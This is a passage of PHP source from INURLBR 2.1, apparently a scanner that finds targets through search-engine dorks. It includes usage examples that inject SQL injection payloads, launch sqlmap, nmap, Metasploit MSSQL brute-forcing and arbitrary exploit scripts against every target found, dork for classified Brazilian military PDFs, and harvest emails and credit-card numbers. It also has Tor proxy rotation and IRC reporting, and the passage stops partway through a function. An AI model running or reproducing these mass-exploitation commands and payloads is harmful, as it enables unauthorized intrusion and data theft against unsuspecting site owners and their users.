 {$_SESSION["c1"]}--regexp{$_SESSION["c0"]} Using regular expression to validate his research, the value of the 
    Expression will be sought within the target/URL.
    Example:  {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} {regular_expression}{$_SESSION["c0"]}
    All Major Credit Cards:
    Usage:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6011[0-9]{12}|3(?:0[0-5]|[68][0-9])[0-9]{11}|3[47][0-9]{13})'{$_SESSION["c0"]}
    
    IP Addresses:
    Usage:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))'{$_SESSION["c0"]}
    
    EMAIL:   
    Usage:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
    

 {$_SESSION["c1"]}---regexp-filter{$_SESSION["c0"]} Using regular expression to filter his research, the value of the 
     Expression will be sought within the target/URL.
    Example:  {$_SESSION["c1"]}---regexp-filter{$_SESSION["c2"]} {regular_expression}{$_SESSION["c0"]}
    EMAIL:   
    Usage:    {$_SESSION["c1"]}---regexp-filter{$_SESSION["c2"]} '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
 

    [!] Small commands manager:
    
 {$_SESSION["c1"]}--exploit-cad{$_SESSION["c0"]} Command register for use within the scanner.
    Format {TYPE_EXPLOIT}::{EXPLOIT_COMMAND}
    Example Format: NMAP::nmap -sV _TARGET_
    Example Format: EXPLOIT1::php xpl.php -t _TARGET_ -s output.txt
    Usage:    {$_SESSION["c1"]}--exploit-cad{$_SESSION["c2"]} 'NMAP::nmap -sV _TARGET_'{$_SESSION["c0"]} 
    Observation: Each registered command is identified by an id of your array.
                 Commands are logged in exploits.conf file.

 {$_SESSION["c1"]}--exploit-all-id{$_SESSION["c0"]} Execute commands, exploits based on id of use,
    (all) is run for each target found by the engine.
     Example: {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]}{id,id}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]}1,2,8,22
         
 {$_SESSION["c1"]}--exploit-vul-id{$_SESSION["c0"]} Execute commands, exploits based on id of use,
    (vull) run command only if the target was considered vulnerable.
     Example: {$_SESSION["c1"]}--exploit-vul-id {$_SESSION["c2"]}{id,id}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-vul-id {$_SESSION["c2"]}1,2,8,22

 {$_SESSION["c1"]}--exploit-list{$_SESSION["c0"]} List all entries command in exploits.conf file.


    [!] Running subprocesses:
    
 {$_SESSION["c1"]}--sub-file{$_SESSION["c0"]}  Subprocess performs an injection 
     strings in URLs found by the engine, via GET or POST.
     Example: {$_SESSION["c1"]}--sub-file {$_SESSION["c2"]}{youfile}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sub-file {$_SESSION["c2"]}exploits_get.txt
         
 {$_SESSION["c1"]}--sub-get{$_SESSION["c0"]} defines whether the strings coming from 
     --sub-file will be injected via GET.
     Usage:   {$_SESSION["c1"]}--sub-get
         
 {$_SESSION["c1"]}--sub-post{$_SESSION["c0"]} defines whether the strings coming from 
     --sub-file will be injected via POST.
     Usage:   {$_SESSION["c1"]}--sub-get
         
 {$_SESSION["c1"]}--sub-concat{$_SESSION["c0"]} Sets string to be concatenated with 
     the target host within the subprocess
     Example: {$_SESSION["c1"]}--sub-concat {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sub-concat {$_SESSION["c2"]}'/login.php'{$_SESSION["c0"]}

 {$_SESSION["c1"]}--sub-cmd-vul{$_SESSION["c0"]} Each vulnerable URL found within the sub-process
     will execute the parameters of this command.
     Example: {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
                  
 {$_SESSION["c1"]}--sub-cmd-all{$_SESSION["c0"]} Run command to each target found within the sub-process scope.
     Example: {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--sub-cmd-all {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}


 {$_SESSION["c1"]}--port-scan{$_SESSION["c0"]} Defines ports that will be validated as open.
     Example: {$_SESSION["c1"]}--port-scan {$_SESSION["c2"]}{ports}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--port-scan {$_SESSION["c2"]}'22,21,23,3306'{$_SESSION["c0"]}
         
 {$_SESSION["c1"]}--port-cmd{$_SESSION["c0"]} Define command that runs when finding an open door.
     Example: {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}'./xpl _TARGETIP_:_PORT_'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--port-cmd {$_SESSION["c2"]}'./xpl _TARGETIP_/file.php?sqli=1'{$_SESSION["c0"]}

 {$_SESSION["c1"]}--port-write{$_SESSION["c0"]} Send values for door.
     Example: {$_SESSION["c1"]}--port-write {$_SESSION["c2"]}{'value0','value1','value3'}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--port-write {$_SESSION["c2"]}\"'NICK nk_test','USER nk_test 8 * :_ola','JOIN #inurlbrasil','PRIVMSG #inurlbrasil : minha_msg'\"{$_SESSION["c0"]}



    [!] Modifying values used within script parameters:
    
 {$_SESSION["c1"]}md5{$_SESSION["c0"]} Encrypt values in md5.
     Example: {$_SESSION["c1"]}md5({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}md5({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=md5({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}

 {$_SESSION["c1"]}base64{$_SESSION["c0"]} Encrypt values in base64.
     Example: {$_SESSION["c1"]}base64({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}base64({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=base64({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}
         
 {$_SESSION["c1"]}hex{$_SESSION["c0"]} Encrypt values in hex.
     Example: {$_SESSION["c1"]}hex({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}hex({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=hex({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}

 {$_SESSION["c1"]}hex{$_SESSION["c0"]} Generate random values.
     Example: {$_SESSION["c1"]}random({$_SESSION["c2"]}{character_counter}{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}random({$_SESSION["c2"]}8{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=random({$_SESSION["c2"]}8{$_SESSION["c1"]})'{$_SESSION["c0"]}

");
}

function __info() {

    return __getOut("
 {$_SESSION["c1"]}_____ _   _ ______ ____  
|_   _| \ | |  ____/ __ \ 
  | | |  \| | |__ | |  | |
  | | | . ` |  __|| |  | |
 _| |_| |\  | |   | |__| |
|_____|_| \_|_|    \____/
 
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current PHP version=>{$_SESSION["c1"]}[ " . phpversion() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current script owner=>{$_SESSION["c1"]}[ " . get_current_user() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current uname=>{$_SESSION["c1"]}[ " . php_uname() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current pwd=>{$_SESSION["c1"]}[ " . getcwd() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}
 
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}GRUPO  INURL BRASIL - PESQUISA AVANÇADA.
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}SCRIPT NAME: INURLBR 2.1
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}AUTOR:    Cleiton Pinheiro
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Nick:     Googleinurl
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Email:    inurlbr@gmail.com  
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Blog:     http://blog.inurl.com.br
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Twitter:  https://twitter.com/googleinurl
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Facebook: https://fb.com/InurlBrasil
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}GIT:      https://github.com/googleinurl
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Pastebin  https://pastebin.com/u/Googleinurl
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}PSS:      https://packetstormsecurity.com/user/googleinurl
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}YOUTUBE:  http://youtube.com/c/INURLBrasil
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}PLUS:     http://google.com/+INURLBrasil
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Version:  2.1

{$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}
 
   {$_SESSION["c1"]}[+]{$_SESSION["c16"]}NECESSARY FOR THE PROPER FUNCTIONING OF THE SCRIPT{$_SESSION["c0"]}
	
     {$_SESSION["c1"]}[ - ]{$_SESSION["c16"]} LIB & CONFIG{$_SESSION["c0"]}

 * PHP Version         5.4.7
 * php5-curl           LIB
 * php5-cli            LIB   
 * cURL support        enabled
 * cURL Information    7.24.0
 * allow_url_fopen     On
 * permission          Reading & Writing
 * User                root privilege, or is in the sudoers group
 * Operating system    LINUX
 * Proxy random        TOR 
                
{$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}
 
   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}PERMISSION EXECUTION: chmod +x inurlbr.php{$_SESSION["c0"]}
   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}INSTALLING LIB PHP-CURL: sudo apt-get install php5-curl{$_SESSION["c0"]}
   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}INSTALLING LIB PHP-CLI: sudo apt-get install php5-cli{$_SESSION["c0"]}
   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}sudo apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl033[0m
   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}INSTALLING PROXY TOR https://www.torproject.org/docs/debian.html.en{$_SESSION["c0"]}
   
{$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}

     {$_SESSION["c1"]}[ - ]{$_SESSION["c16"]} COMMANDS SIMPLE SCRIPT{$_SESSION["c0"]}
   
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:php?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c0"]} 
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:aspx?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:aspx (id|new)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\"{$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'index of wp-content/uploads' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6,2,4 {$_SESSION["c1"]}-t {$_SESSION["c2"]}2 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'Index of /wp-content/uploads'{$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.mil.br intext:(confidencial) ext:pdf' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 -t 2 --exploit-get {$_SESSION["c3"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'confidencial'{$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.mil.br intext:(secreto) ext:pdf' {$_SESSION["c1"]}-s save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}2 {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'secreto'{$_SESSION["c0"]}        
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:aspx (id|new)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}\"?´'%270x27;\"{$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'.new.php?new id' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6,7,2,3 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'::EXPLOIT-SUCESS::'{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'new.php?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}teste.txt  {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27  {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]}'{$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:pt inurl:aspx (id|q)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}bruteforce.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27 {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'msfcli auxiliary/scanner/mssql/mssql_login RHOST={$_SESSION["c9"]}_TARGETIP_ {$_SESSION["c2"]}MSSQL_USER=inurlbr MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:id & inurl:php' {$_SESSION["c1"]}-s {$_SESSION["c2"]}get.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'python ../sqlmap/sqlmap.py -u \"{$_SESSION["c14"]}_TARGETFULL_{$_SESSION["c2"]}\" --dbs'{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:index.php?id=' {$_SESSION["c1"]}-q 1,2,10 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"'?´0x27'\" {$_SESSION["c1"]}-s {$_SESSION["c2"]}report.txt {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap -Pn -p 1-8080 --script http-enum --open {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]}'{$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email' {$_SESSION["c1"]}-s {$_SESSION["c2"]}reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}emails.txt {$_SESSION["c1"]}-m{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}urls.txt {$_SESSION["c1"]}-u{$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:gov.bo' {$_SESSION["c1"]}-s {$_SESSION["c2"]}govs.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6 {$_SESSION["c0"]} 
 
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.uk' {$_SESSION["c1"]}-s {$_SESSION["c2"]}uk.txt {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]} 'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' {$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorksSqli.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}govs.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6 {$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorksSqli.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}sqli.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6  {$_SESSION["c1"]}--irc {$_SESSION["c2"]}'irc.rizon.net#inurlbrasil'   {$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:\"cgi-bin/login.cgi\"' {$_SESSION["c1"]}-s {$_SESSION["c2"]}cgi.txt --ifurl 'cgi' --command-all 'php xplCGI.php _TARGET_' {$_SESSION["c0"]} 
 
./inurlbr.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]} {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\"{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]} {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?pass=1234\" {$_SESSION["c1"]}-a {$_SESSION["c2"]}'<title>hello! admin</title>'{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find_valid_cod-200.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}5{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--range {$_SESSION["c2"]}'200.20.10.1,200.20.10.255' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'php roteador.php _TARGETIP_'  {$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--range-rad {$_SESSION["c2"]}'1500' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'php roteador.php _TARGETIP_'  {$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork-rad {$_SESSION["c2"]}'20' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}\"?´'%270x27;\" {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,2,6,4,5,9,7,8  {$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork-rad {$_SESSION["c2"]}'20' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}\"?´'%270x27;\" {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,2,6,4,5,9,7,8  {$_SESSION["c0"]} --pr
 
./inurlbr.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorksCGI.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,2,6,4,5,9,7,8  {$_SESSION["c0"]} --pr --shellshock
 
./inurlbr.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorks_Wordpress_revslider.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,2,6,4,5,9,7,8  {$_SESSION["c1"]}--sub-file {$_SESSION["c2"]}'xpls_Arbitrary_File_Download.txt' {$_SESSION["c0"]} 
   {$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}
  
  {$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}It it also useful to know the full path to the PHP binary on your computer. {$_SESSION["c0"]}
  {$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}There are several ways of finding out. For Ubuntu and Mac OS X the path is '/usr/bin/php'.{$_SESSION["c0"]}

  googleinurl@inurlbr:~$ which php 
  /usr/bin/php 
  googleinurl@inurlbr:~/cli$ whereis php 
  php: /usr/bin/php /usr/share/php /usr/share/man/man1/php.1.gz 
  googleinurl@inurlbr:~/cli$ type -a php 
  php is /usr/bin/php

{$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}


");
}

################################################################################
#BANNER HOME####################################################################

function __bannerLogo() {

    $vis = ($_SESSION["os"] != 1) ? ("\033[1;3" . rand(1, 10) . "m") : NULL;

    return (!is_null($_SESSION['config']['no-banner']) ? NULL : "
{$vis}    _____ {$_SESSION["c1"]} .701F. .iBR.   .7CL. .70BR.   .7BR. .7BR'''Cq.   .70BR.      {$_SESSION["c12"]}.1BR'''Yp, .8BR'''Cq.  
{$vis}   (_____){$_SESSION["c1"]}   01     01N.    C     01       C     01   .01.    01        {$_SESSION["c3"]}  01    Yb   01   .01. 
{$vis}   (() ()){$_SESSION["c1"]}   01     C YCb   C     01       C     01   ,C9     01        {$_SESSION["c12"]}  01    dP   01   ,C9  
{$vis}    \   / {$_SESSION["c1"]}   01     C  .CN. C     01       C     0101dC9      01        {$_SESSION["c3"]}  01'''bg.   0101dC9   
{$vis}     \ /  {$_SESSION["c1"]}   01     C   .01.C     01       C     01  YC.      01      , {$_SESSION["c12"]}  01    .Y   01  YC.   
{$vis}     /=\  {$_SESSION["c1"]}   01     C     Y01     YC.     ,C     01   .Cb.    01     ,C {$_SESSION["c3"]}  01    ,9   01   .Cb. 
{$vis}    [___] {$_SESSION["c1"]} .J01L. .JCL.    YC      .b0101d'.   .J01L. .J01. .J01010101C {$_SESSION["c12"]}.J0101Cd9  .J01L. .J01./ {$_SESSION["c1"]}2.1\n
{$_SESSION["c1"]}__[ ! ] Neither war between hackers, nor peace for the system.
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}http://blog.inurl.com.br
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}http://fb.com/InurlBrasil
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}http://twitter.com/@googleinurl{$_SESSION["c0"]}
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}http://github.com/googleinurl{$_SESSION["c0"]}
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}Current PHP version::[ {$_SESSION["c1"]}" . phpversion() . " {$_SESSION["c16"]}]{$_SESSION["c0"]}
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}Current script owner::[ {$_SESSION["c1"]}" . get_current_user() . " {$_SESSION["c16"]}]{$_SESSION["c0"]}
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}Current uname::[ {$_SESSION["c1"]}" . php_uname() . " {$_SESSION["c16"]}]{$_SESSION["c0"]}
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}Current pwd::[ {$_SESSION["c1"]}" . getcwd() . " {$_SESSION["c16"]}]{$_SESSION["c0"]}
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c2"]}Help: php inurlbr.php --help{$_SESSION["c0"]}
{$_SESSION["c1"]}------------------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}
");
}

################################################################################
#CHANGE PROXY FUNCTION IN TIME##################################################
################################################################################

function __timeValueChangeProxy($sec = NULL) {

    return not_isnull_empty($sec) ? date('Y-m-d H:i:s', strtotime(date('Y-m-d H:i:s') . " + {$sec} second")) : NULL;
}

function __timeSecChangeProxy($list_proxy) {

    if ($_SESSION["config"]["time_change_proxy"] < date('Y-m-d H:i:s') && !is_null($list_proxy)) {
        $proxy = $list_proxy[rand(0, count($list_proxy) - 1)];
        echo ("[ INFO ][PROXY] CHANGE: {$proxy}  - " . date('Y-m-d H:i:s') . "\n");
        $_SESSION["config"]["proxy"] = $proxy;
        $_SESSION["config"]["time_change_proxy"] = __timeValueChangeProxy($_SESSION["config"]["time-proxy"]);
        __plus();
    }
}

################################################################################
#GET STATUS HTTP URL############################################################
################################################################################

function __getStatusURL($url) {

    if (!is_null($url) && !empty($url)) {
        return FALSE;
    }
    __plus();
    $status = array();
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    $resultadoCurl = curl_exec($curl);
    if ($resultadoCurl) {
        preg_match_all('(HTTP.*)', $resultadoCurl, $status['http']) . __plus();

        return (!is_null($status['http']) && !empty($status['http'])) ? TRUE : FALSE;
    }
    unset($curl);
    return FALSE;
}

################################################################################
#BEEP ##########################################################################
################################################################################

function __cli_beep() {

    echo ($_SESSION['config']['beep']) ? "\x07" : NULL;
}

################################################################################
#SETUP TO RUN COMMANDS IN ID####################################################
################################################################################

function __configExploitsExec($id, $alvo) {

    $resultadoURL = __configExploitsList();
    $final = array();
    $id_ = ((strstr($id, ','))) ? explode(',', $id) : array($id); // MULTIPLAS ID'S EXPLOITS

    foreach ($resultadoURL as $key) {
        $__key = strstr($key, '::') ? explode("\n", $key) : NULL;
        $final = is_array($__key) ? array_merge($final, $__key) : $final;
    }
    foreach ($id_ as $value) {
